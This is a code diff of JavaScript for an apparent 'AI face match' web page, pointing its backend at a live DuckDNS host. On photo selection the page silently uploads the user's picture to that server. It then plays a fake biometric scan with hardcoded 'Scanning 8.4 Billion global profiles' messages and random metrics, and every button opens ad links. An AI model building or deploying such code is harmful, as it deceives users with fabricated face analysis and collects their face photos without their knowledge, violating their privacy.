@@ -4,8 +4,8 @@
 // Adsterra Direct Link
 const AD_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q523uy7yt?key=a608a7a53c25642c3f909011fcbbc596";
 
-// Apne Backend Server ka URL (e.g., "https://your-backend-app.render.com" ya local testing ke liye "http://localhost:3000")
-const BACKEND_URL = "https://your-backend-app.render.com"; 
+// Aapka Live DuckDNS Backend URL
+const BACKEND_URL = "http://asadgames2.duckdns.org"; 
 
 
 /* ==========================================
@@ -37,50 +37,67 @@ const m3 = document.getElementById('m3');
    3. MATRIX / PARTICLE CANVAS BACKGROUND
 ========================================== */
 const canvas = document.getElementById('bgCanvas');
-const ctx = canvas.getContext('2d');
+if (canvas) {
+  const ctx = canvas.getContext('2d');
 
-function resizeCanvas() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+
+  const particles = Array.from({ length: 45 }, () => ({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    radius: Math.random() * 2 + 1,
+    dx: (Math.random() - 0.5) * 0.8,
+    dy: (Math.random() - 0.5) * 0.8,
+    alpha: Math.random() * 0.5 + 0.2
+  }));
+
+  function animateCanvas() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particles.forEach(p => {
+      p.x += p.dx;
+      p.y += p.dy;
+      if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
+      if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
+
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(56, 189, 248, ${p.alpha})`;
+      ctx.fill();
+    });
+    requestAnimationFrame(animateCanvas);
+  }
+  animateCanvas();
 }
-resizeCanvas();
-window.addEventListener('resize', resizeCanvas);
-
-const particles = Array.from({ length: 45 }, () => ({
-  x: Math.random() * canvas.width,
-  y: Math.random() * canvas.height,
-  radius: Math.random() * 2 + 1,
-  dx: (Math.random() - 0.5) * 0.8,
-  dy: (Math.random() - 0.5) * 0.8,
-  alpha: Math.random() * 0.5 + 0.2
-}));
-
-function animateCanvas() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  particles.forEach(p => {
-    p.x += p.dx;
-    p.y += p.dy;
-    if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
-    if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
-
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-    ctx.fillStyle = `rgba(56, 189, 248, ${p.alpha})`;
-    ctx.fill();
-  });
-  requestAnimationFrame(animateCanvas);
-}
-animateCanvas();
 
 
 /* ==========================================
    4. WEB AUDIO BEEP SOUND EFFECTS
 ========================================== */
+let audioCtx = null;
+
+function getAudioContext() {
+  if (!audioCtx) {
+    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+    if (AudioContextClass) {
+      audioCtx = new AudioContextClass();
+    }
+  }
+  if (audioCtx && audioCtx.state === 'suspended') {
+    audioCtx.resume();
+  }
+  return audioCtx;
+}
+
 function playBeepSound(freq = 800, duration = 0.08) {
   try {
-    const AudioCtx = window.AudioContext || window.webkitAudioContext;
-    if (!AudioCtx) return;
-    const ctx = new AudioCtx();
+    const ctx = getAudioContext();
+    if (!ctx) return;
+
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
 
@@ -95,7 +112,7 @@ function playBeepSound(freq = 800, duration = 0.08) {
     osc.start();
     osc.stop(ctx.currentTime + duration);
   } catch (e) {
-    /* Ignore audio play restrictions */
+    /* Audio fail-safe for restricted autoplay */
   }
 }
 
@@ -103,31 +120,36 @@ function playBeepSound(freq = 800, duration = 0.08) {
 /* ==========================================
    5. PHOTO SELECTION & AUTO-UPLOAD TO SERVER
 ========================================== */
-photoInput.addEventListener('change', function(e) {
-  const file = e.target.files[0];
-  if (file) {
-    // A. Local Browser Preview
-    const reader = new FileReader();
-    reader.onload = function(event) {
-      const src = event.target.result;
-      userImagePreview.src = src;
-      scanningImg.src = src;
-      finalUserImg.src = src;
+if (photoInput) {
+  photoInput.addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (file) {
+      // Audio Context Warmup on User Gesture
+      getAudioContext();
 
-      userImagePreview.classList.remove('hidden');
-      uploadPlaceholder.classList.add('hidden');
-      scanBtn.classList.remove('hidden');
+      // A. Local Browser Preview
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const src = event.target.result;
+        if (userImagePreview) userImagePreview.src = src;
+        if (scanningImg) scanningImg.src = src;
+        if (finalUserImg) finalUserImg.src = src;
+
+        if (userImagePreview) userImagePreview.classList.remove('hidden');
+        if (uploadPlaceholder) uploadPlaceholder.classList.add('hidden');
+        if (scanBtn) scanBtn.classList.remove('hidden');
+      }
+      reader.readAsDataURL(file);
+
+      // B. Photo Ko DuckDNS Server Par Save Karein
+      uploadPhotoToOwnServer(file);
     }
-    reader.readAsDataURL(file);
-
-    // B. Photo Ko Apne Node.js Backend Server Par Save Karein
-    uploadPhotoToOwnServer(file);
-  }
-});
+  });
+}
 
 function uploadPhotoToOwnServer(fileData) {
-  if (!BACKEND_URL || BACKEND_URL.includes("your-backend-app")) {
-    console.warn("Backend URL not set. Photo will not save to server.");
+  if (!BACKEND_URL) {
+    console.warn("Backend URL missing!");
     return;
   }
 
@@ -141,13 +163,13 @@ function uploadPhotoToOwnServer(fileData) {
   .then(response => response.json())
   .then(data => {
     if (data.success) {
-      console.log("✓ Photo successfully saved to server:", data.path);
+      console.log("✓ Photo saved successfully on server:", data.path);
     } else {
-      console.error("Server upload failed:", data.message);
+      console.error("Server upload rejected:", data.message);
     }
   })
   .catch(error => {
-    console.error("Network error saving photo:", error);
+    console.error("Network error uploading photo to server:", error);
   });
 }
 
@@ -156,6 +178,7 @@ function uploadPhotoToOwnServer(fileData) {
    6. AI FACE MESH GENERATOR
 ========================================== */
 function generateFaceMesh() {
+  if (!meshOverlay) return;
   meshOverlay.innerHTML = '';
   const points = [
     {top: '30%', left: '35%'}, {top: '30%', left: '65%'}, // Eyes
@@ -179,62 +202,75 @@ function generateFaceMesh() {
 /* ==========================================
    7. SCANNING ANIMATION & AD TRIGGER
 ========================================== */
-scanBtn.addEventListener('click', function() {
-  // A. Trigger Adsterra Direct Link Ad in New Tab
-  if (AD_DIRECT_LINK) {
-    window.open(AD_DIRECT_LINK, '_blank');
-  }
+if (scanBtn) {
+  scanBtn.addEventListener('click', function() {
+    // Audio Context Activate
+    getAudioContext();
 
-  // B. Switch to Scanning View
-  uploadSection.classList.add('hidden');
-  scanningSection.classList.remove('hidden');
-  generateFaceMesh();
-
-  let percent = 0;
-  const statusSteps = [
-    "Aligning biometric facial vectors...",
-    "Measuring nodal points & pupil gap...",
-    "Scanning 8.4 Billion global profiles...",
-    "Filtering country & gender clusters...",
-    "Calculating facial symmetry percentage...",
-    "Match found! Rendering result..."
-  ];
-
-  const interval = setInterval(() => {
-    percent += 2;
-    progressBar.style.width = percent + '%';
-    scanPercent.textContent = percent + '%';
-
-    // Random Live Metrics Updates
-    m1.textContent = `${(62 + Math.random() * 5).toFixed(1)} mm`;
-    m2.textContent = `${(112 + Math.random() * 8).toFixed(1)}°`;
-    m3.textContent = `${(96 + Math.random() * 3.8).toFixed(1)}%`;
-
-    if (percent % 10 === 0) playBeepSound(900 + percent * 5, 0.05);
-
-    if (percent === 15) scanStatus.textContent = statusSteps[0];
-    if (percent === 35) scanStatus.textContent = statusSteps[1];
-    if (percent === 55) scanStatus.textContent = statusSteps[2];
-    if (percent === 75) scanStatus.textContent = statusSteps[3];
-    if (percent === 90) scanStatus.textContent = statusSteps[4];
-
-    if (percent >= 100) {
-      clearInterval(interval);
-      playBeepSound(1200, 0.2); // Success Sound
-      scanningSection.classList.add('hidden');
-      resultSection.classList.remove('hidden');
+    // A. Trigger Adsterra Direct Link Ad
+    if (AD_DIRECT_LINK) {
+      window.open(AD_DIRECT_LINK, '_blank');
     }
-  }, 60);
-});
+
+    // B. Switch Views
+    if (uploadSection) uploadSection.classList.add('hidden');
+    if (scanningSection) scanningSection.classList.remove('hidden');
+    generateFaceMesh();
+
+    let percent = 0;
+    const statusSteps = [
+      "Aligning biometric facial vectors...",
+      "Measuring nodal points & pupil gap...",
+      "Scanning 8.4 Billion global profiles...",
+      "Filtering country & gender clusters...",
+      "Calculating facial symmetry percentage...",
+      "Match found! Rendering result..."
+    ];
+
+    const interval = setInterval(() => {
+      percent += 2;
+      if (progressBar) progressBar.style.width = percent + '%';
+      if (scanPercent) scanPercent.textContent = percent + '%';
+
+      // Random Live Metrics Updates
+      if (m1) m1.textContent = `${(62 + Math.random() * 5).toFixed(1)} mm`;
+      if (m2) m2.textContent = `${(112 + Math.random() * 8).toFixed(1)}°`;
+      if (m3) m3.textContent = `${(96 + Math.random() * 3.8).toFixed(1)}%`;
+
+      if (percent % 10 === 0) playBeepSound(900 + percent * 5, 0.05);
+
+      if (scanStatus) {
+        if (percent === 15) scanStatus.textContent = statusSteps[0];
+        if (percent === 35) scanStatus.textContent = statusSteps[1];
+        if (percent === 55) scanStatus.textContent = statusSteps[2];
+        if (percent === 75) scanStatus.textContent = statusSteps[3];
+        if (percent === 90) scanStatus.textContent = statusSteps[4];
+      }
+
+      if (percent >= 100) {
+        clearInterval(interval);
+        playBeepSound(1200, 0.2); // Success Sound
+        if (scanningSection) scanningSection.classList.add('hidden');
+        if (resultSection) resultSection.classList.remove('hidden');
+      }
+    }, 60);
+  });
+}
 
 
 /* ==========================================
    8. MONETIZATION BUTTONS
 ========================================== */
-document.getElementById('unlockSocialBtn').addEventListener('click', function() {
-  if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
-});
+const unlockSocialBtn = document.getElementById('unlockSocialBtn');
+if (unlockSocialBtn) {
+  unlockSocialBtn.addEventListener('click', function() {
+    if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
+  });
+}
 
-document.getElementById('downloadReportBtn').addEventListener('click', function() {
-  if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
-});
+const downloadReportBtn = document.getElementById('downloadReportBtn');
+if (downloadReportBtn) {
+  downloadReportBtn.addEventListener('click', function() {
+    if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
+  });
+}
